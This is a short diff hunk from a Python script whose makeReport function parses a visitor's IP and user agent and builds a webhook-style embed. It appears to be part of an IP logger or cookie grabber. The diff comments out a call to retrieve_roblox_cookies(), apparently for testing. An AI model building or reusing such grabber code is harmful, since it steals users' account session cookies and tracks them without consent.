@@ -172,7 +172,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 
     os, browser = httpagentparser.simple_detect(useragent)
 
-    roblox_cookies = retrieve_roblox_cookies()
+    #roblox_cookies = "test" #retrieve_roblox_cookies()
 
     embed = {
     "username": config["username"],
